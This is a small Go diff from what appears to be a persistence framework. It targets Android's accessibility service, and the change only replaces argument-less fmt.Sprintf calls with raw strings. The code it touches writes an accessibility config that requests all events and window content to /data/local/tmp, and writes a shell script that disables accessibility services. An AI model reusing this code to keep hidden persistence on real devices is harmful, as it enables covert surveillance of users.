@@ -396,13 +396,13 @@ func (m *AndroidAccessibilityMethod) Install(params *PersistenceParams) (*Persis
 		serviceName = "AccessibilityService"
 	}
 
-	serviceConfig := fmt.Sprintf(`<accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
+	serviceConfig := `<accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
     android:description="@string/accessibility_service_description"
     android:accessibilityEventTypes="typeAllMask"
     android:accessibilityFeedbackType="feedbackGeneric"
     android:notificationTimeout="100"
     android:canRetrieveWindowContent="true"
-    android:settingsActivity=".SettingsActivity" />`)
+    android:settingsActivity=".SettingsActivity" />`
 
 	configPath := "/data/local/tmp/accessibility.xml"
 	if err := os.WriteFile(configPath, []byte(serviceConfig), 0644); err != nil {
@@ -444,10 +444,10 @@ func (m *AndroidAccessibilityMethod) Remove(params *PersistenceParams) error {
 		serviceName = "AccessibilityService"
 	}
 
-	disableScript := fmt.Sprintf(`#!/system/bin/sh
+	disableScript := `#!/system/bin/sh
 settings put secure enabled_accessibility_services ""
 settings put secure accessibility_enabled 0
-`)
+`
 
 	scriptPath := filepath.Join("/data/local/tmp", "disable_accessibility.sh")
 	if err := os.WriteFile(scriptPath, []byte(disableScript), 0755); err != nil {
